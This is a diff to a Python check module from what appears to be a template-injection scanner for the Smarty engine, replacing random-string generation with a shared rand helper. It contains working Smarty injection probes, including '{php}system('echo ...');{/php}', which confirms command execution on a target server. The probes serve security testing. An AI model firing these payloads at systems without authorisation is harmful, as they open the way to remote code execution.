@@ -1,6 +1,6 @@
 from core.check import Check
 from utils.loggers import log
-import random
+from utils import rand
 import string
 import requests
 import urlparse
@@ -50,10 +50,10 @@ class Smarty(Check):
             
     def _check_engine(self):
         
-        randA = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
-        randB = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
+        randA = rand.randstr_n(1)
+        randB = rand.randstr_n(1)
         
-        payload = '%s{*comment*}%s' % (randA, randB)
+        payload = '%s{*%s*}%s' % (randA, rand.randstr_n(1), randB)
         expected = randA + randB
                 
         if expected == self.req(payload):
@@ -62,8 +62,8 @@ class Smarty(Check):
     
     def _check_reflection(self):
         
-        randA = random.randint(10, 100)
-        randB = random.randint(10, 100)
+        randA = rand.randint_n(1)
+        randB = rand.randint_n(1)
 
         payload = '{%i*%i}' % (randA, randB)
         expected = str(randA*randB)
@@ -73,7 +73,7 @@ class Smarty(Check):
         
     def _check_os(self):
         
-        expected_rand = str(random.randint(999, 10000))
+        expected_rand = str(rand.randint_n(1))
         payload = """{php}system('echo %s');{/php}""" % expected_rand
         
         result_php_tag = self.req(payload) 
